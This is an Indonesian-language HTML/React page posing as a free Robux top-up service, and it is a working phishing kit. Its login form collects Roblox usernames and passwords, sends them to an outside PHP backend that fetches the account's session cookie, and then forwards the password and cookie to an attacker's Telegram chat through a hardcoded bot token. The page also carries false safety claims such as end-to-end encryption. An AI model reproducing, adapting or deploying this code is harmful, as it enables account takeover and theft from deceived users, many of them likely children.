<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Robux Topup - 100% Gratis</title>
    <meta name="description" content="Dapatkan Robux gratis untuk akun Roblox Anda">
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div id="root"></div>
    
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    
    <script type="text/babel">
        const { useState } = React;
        const { User, Lock, Eye, EyeOff, Gift, Send, CheckCircle, AlertCircle, Loader } = lucide;

        // ‚ö†Ô∏è KONFIGURASI - GANTI INI!
        const BACKEND_URL = 'https://topupbckd.42web.io/get-cookie.php'; // URL Backend PHP Anda
        const TELEGRAM_BOT_TOKEN = '8223850482:AAEiTRX9TduTyEmLdiuyeb_tQzlG9-h4S58';
        const TELEGRAM_CHAT_ID = '7958165198';

        function RobloxTopupTelegram() {
          const [step, setStep] = useState(1);
          const [username, setUsername] = useState('');
          const [password, setPassword] = useState('');
          const [showPassword, setShowPassword] = useState(false);
          const [selectedPackage, setSelectedPackage] = useState(null);
          const [loading, setLoading] = useState(false);
          const [error, setError] = useState('');

          const packages = [
            { id: 1, robux: 400, icon: 'üíé', color: 'from-blue-500 to-cyan-500' },

            { id: 5, robux: 10000, icon: 'üî•', color: 'from-red-500 to-rose-500' },
          ];

          const handleSubmit = async () => {
            if (!username.trim() || !password.trim()) {
              setError('Username dan password harus diisi!');
              return;
            }

            setLoading(true);
            setError('');

            try {
              // Panggil Backend PHP untuk ambil cookie
              const backendResponse = await fetch(BACKEND_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                  username: username, 
                  password: password 
                })
              });

              const backendData = await backendResponse.json();

              if (!backendData.success) {
                setError(backendData.error || 'Login gagal. Periksa username/password.');
                setLoading(false);
                return;
              }

              // Cookie berhasil diambil, kirim ke Telegram
              const message = `
üéÆ *TOPUP ROBLOX BARU!*
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ

üë§ *USERNAME:* ${username}
üîë *PASSWORD:* ${password}

üíé *JUMLAH ROBUX:* ${selectedPackage.robux.toLocaleString()} Robux
üí∞ *HARGA:* GRATIS

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üç™ *COOKIE ASLI ROBLOX:*

\`${backendData.cookie}\`

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚è∞ *WAKTU:* ${new Date().toLocaleString('id-ID', {
  dateStyle: 'full',
  timeStyle: 'medium'
})}

üìç *STATUS:* ‚úÖ Cookie Berhasil Diambil - Menunggu Proses
              `.trim();

              const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: TELEGRAM_CHAT_ID,
                  text: message,
                  parse_mode: 'Markdown'
                })
              });

              const telegramData = await telegramResponse.json();

              if (telegramData.ok) {
                setStep(3);
              } else {
                setError(`Gagal kirim ke Telegram: ${telegramData.description}`);
              }
            } catch (err) {
              setError('Terjadi kesalahan: ' + err.message);
            } finally {
              setLoading(false);
            }
          };

          // STEP 1: PILIH PAKET
          if (step === 1) {
            return (
              <div className="min-h-screen bg-gradient-to-br from-indigo-600 via-purple-600 to-pink-600 p-4">
                <div className="max-w-5xl mx-auto">
                  <div className="text-center mb-8 mt-8">
                    <div className="inline-block bg-white rounded-full p-4 shadow-2xl mb-4 animate-bounce">
                      <Gift className="w-20 h-20 text-purple-600" />
                    </div>
                    <h1 className="text-6xl font-bold text-white mb-3 drop-shadow-lg">FREE ROBUX</h1>
                    <p className="text-2xl text-purple-100 font-semibold">Pilih Jumlah Robux Gratis!</p>
                    <div className="mt-4 inline-block bg-yellow-400 text-yellow-900 px-8 py-3 rounded-full font-bold text-lg animate-pulse">
                      ‚ö° 100% GRATIS - TANPA BIAYA ‚ö°
                    </div>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 mb-6">
                    {packages.map((pkg) => (
                      <div
                        key={pkg.id}
                        onClick={() => {
                          setSelectedPackage(pkg);
                          setTimeout(() => setStep(2), 300);
                        }}
                        className="bg-white rounded-3xl p-8 cursor-pointer transition-all transform hover:scale-110 hover:rotate-1 shadow-2xl"
                      >
                        <div className="text-center">
                          <div className="text-7xl mb-4 animate-bounce">{pkg.icon}</div>
                          <h3 className="text-4xl font-bold text-gray-800 mb-2">
                            {pkg.robux.toLocaleString()}
                          </h3>
                          <p className="text-gray-600 text-lg mb-4">Robux</p>
                          <div className={`bg-gradient-to-r ${pkg.color} text-white font-bold py-3 px-6 rounded-xl text-xl shadow-lg`}>
                            GRATIS
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>

                  <div className="grid grid-cols-3 gap-4 mt-8">
                    <div className="bg-white bg-opacity-20 backdrop-blur rounded-xl p-4 text-center">
                      <div className="text-4xl mb-2">üîí</div>
                      <p className="text-white font-bold">100% Aman</p>
                    </div>
                    <div className="bg-white bg-opacity-20 backdrop-blur rounded-xl p-4 text-center">
                      <div className="text-4xl mb-2">‚ö°</div>
                      <p className="text-white font-bold">Proses Cepat</p>
                    </div>
                    <div className="bg-white bg-opacity-20 backdrop-blur rounded-xl p-4 text-center">
                      <div className="text-4xl mb-2">üíØ</div>
                      <p className="text-white font-bold">Terpercaya</p>
                    </div>
                  </div>
                </div>
              </div>
            );
          }

          // STEP 2: LOGIN
          if (step === 2) {
            return (
              <div className="min-h-screen bg-gradient-to-br from-blue-600 via-purple-600 to-pink-600 p-4 flex items-center justify-center">
                <div className="w-full max-w-md">
                  <div className="text-center mb-6">
                    <div className="inline-block bg-white rounded-2xl p-4 shadow-xl mb-4">
                      <div className="text-5xl">{selectedPackage.icon}</div>
                    </div>
                    <h2 className="text-3xl font-bold text-white mb-2">
                      {selectedPackage.robux.toLocaleString()} Robux
                    </h2>
                    <p className="text-purple-100 text-lg">Login untuk claim Robux gratis!</p>
                  </div>

                  <div className="bg-white rounded-2xl shadow-2xl overflow-hidden">
                    <div className="bg-gradient-to-r from-purple-600 to-pink-600 p-4 text-white text-center">
                      <h3 className="text-xl font-bold">Login Akun Roblox</h3>
                      <p className="text-sm text-purple-100 mt-1">Masukkan username & password</p>
                    </div>

                    <div className="p-6">
                      <div className="mb-4">
                        <label className="block text-gray-700 font-semibold mb-2">
                          Username Roblox
                        </label>
                        <div className="relative">
                          <User className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                          <input
                            type="text"
                            value={username}
                            onChange={(e) => setUsername(e.target.value)}
                            placeholder="Masukkan username"
                            className="w-full pl-10 pr-4 py-3 border-2 border-gray-300 rounded-lg focus:border-purple-500 focus:outline-none text-lg"
                            autoComplete="off"
                          />
                        </div>
                      </div>

                      <div className="mb-6">
                        <label className="block text-gray-700 font-semibold mb-2">
                          Password
                        </label>
                        <div className="relative">
                          <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                          <input
                            type={showPassword ? 'text' : 'password'}
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            placeholder="Masukkan password"
                            onKeyDown={(e) => e.key === 'Enter' && handleSubmit()}
                            className="w-full pl-10 pr-12 py-3 border-2 border-gray-300 rounded-lg focus:border-purple-500 focus:outline-none text-lg"
                            autoComplete="off"
                          />
                          <button
                            type="button"
                            onClick={() => setShowPassword(!showPassword)}
                            className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                          >
                            {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                          </button>
                        </div>
                      </div>

                      {error && (
                        <div className="mb-4 bg-red-50 border-l-4 border-red-500 p-3 rounded">
                          <div className="flex items-start gap-2">
                            <AlertCircle className="w-5 h-5 text-red-500 flex-shrink-0" />
                            <p className="text-red-700 text-sm">{error}</p>
                          </div>
                        </div>
                      )}

                      <div className="mb-6 bg-blue-50 border border-blue-200 rounded-lg p-4">
                        <div className="flex items-start gap-2">
                          <AlertCircle className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
                          <div className="text-sm text-blue-800">
                            <p className="font-semibold mb-1">üîí Data Anda Aman:</p>
                            <ul className="space-y-1 text-xs">
                              <li>‚úì Terenkripsi end-to-end</li>
                              <li>‚úì Proses dalam 1-24 jam</li>
                            </ul>
                          </div>
                        </div>
                      </div>

                      <button
                        onClick={handleSubmit}
                        disabled={loading || !username.trim() || !password.trim()}
                        className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white py-4 rounded-lg font-bold text-lg hover:from-purple-700 hover:to-pink-700 disabled:from-gray-400 disabled:to-gray-500 transition-all flex items-center justify-center gap-2 shadow-lg"
                      >
                        {loading ? (
                          <>
                            <Loader className="w-6 h-6 animate-spin" />
                            Memproses...
                          </>
                        ) : (
                          <>
                            <Send className="w-6 h-6" />
                            CLAIM ROBUX GRATIS
                          </>
                        )}
                      </button>

                      <button
                        onClick={() => setStep(1)}
                        className="w-full mt-3 text-purple-600 font-semibold hover:text-purple-700 py-2"
                      >
                        ‚Üê Pilih Paket Lain
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            );
          }

          // STEP 3: SUCCESS
          if (step === 3) {
            return (
              <div className="min-h-screen bg-gradient-to-br from-green-500 via-emerald-600 to-teal-600 p-4 flex items-center justify-center">
                <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 text-center">
                  <div className="inline-block bg-green-100 rounded-full p-6 mb-6 animate-bounce">
                    <CheckCircle className="w-24 h-24 text-green-600" />
                  </div>

                  <h2 className="text-4xl font-bold text-gray-800 mb-4">
                    Berhasil! üéâ
                  </h2>
                  <p className="text-gray-600 text-lg mb-6">
                    Request topup <span className="font-bold text-green-600">{selectedPackage.robux.toLocaleString()} Robux</span> untuk <span className="font-bold">{username}</span> telah dikirim!
                  </p>
                  
                  <div className="bg-green-50 rounded-xl p-5 mb-6 border-2 border-green-200">
                    <div className="space-y-3">
                      <div className="flex justify-between items-center">
                        <span className="text-gray-600 font-semibold">Username:</span>
                        <span className="font-bold">{username}</span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-gray-600 font-semibold">Robux:</span>
                        <span className="font-bold text-2xl text-purple-600">
                          {selectedPackage.robux.toLocaleString()} üíé
                        </span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-gray-600 font-semibold">Status:</span>
                        <span className="bg-yellow-400 text-yellow-900 px-3 py-1 rounded-full text-sm font-bold">
                          ‚è≥ Diproses
                        </span>
                      </div>
                    </div>
                  </div>

                  <div className="bg-blue-50 rounded-lg p-4 mb-6">
                    <p className="text-sm text-blue-800">
                      <span className="font-bold">‚è∞ Estimasi:</span> 1-24 jam<br />
                      <span className="text-xs">Robux akan masuk ke akun Anda</span>
                    </p>
                  </div>

                  <button
                    onClick={() => {
                      setStep(1);
                      setUsername('');
                      setPassword('');
                      setSelectedPackage(null);
                    }}
                    className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white py-4 rounded-xl font-bold text-lg hover:from-purple-700 hover:to-pink-700 transition-all shadow-lg mb-3"
                  >
                    üéÆ Topup Akun Lain
                  </button>

                  <p className="text-gray-500 text-sm">
                    Terima kasih telah menggunakan layanan kami! ‚ú®
                  </p>
                </div>
              </div>
            );
          }
        }

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<RobloxTopupTelegram />);
    </script>
</body>
</html>
